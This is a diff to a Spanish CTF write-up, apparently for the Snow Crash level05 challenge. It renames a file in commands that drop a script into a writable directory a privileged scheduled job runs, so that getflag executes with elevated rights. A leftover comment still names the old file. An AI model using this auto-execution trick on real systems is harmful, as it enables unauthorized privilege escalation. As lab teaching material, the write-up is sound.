@@ -87,7 +87,7 @@ Confirmamos que el grupo `level05` tiene permisos de escritura en la carpeta.
 Creamos un script malicioso diseñado para ejecutar `getflag` y redirigir la salida a un archivo legible en `/tmp`:
 
 ```bash
-echo "/bin/getflag > /tmp/token" > /opt/openarenaserver/break
+echo "/bin/getflag > /tmp/token" > /opt/openarenaserver/token
 ```
 
 ### Paso 3: Ejecución Automática
@@ -97,7 +97,7 @@ Dado que no podemos ejecutar el script principal manualmente como `flag05`, espe
 Sabemos que el exploit ha funcionado cuando el archivo desaparece del directorio:
 
 ```bash
-ls /opt/openarenaserver/break
+ls /opt/openarenaserver/token
 # ls: cannot access /opt/openarenaserver/break.sh: No such file or directory
 
 ```
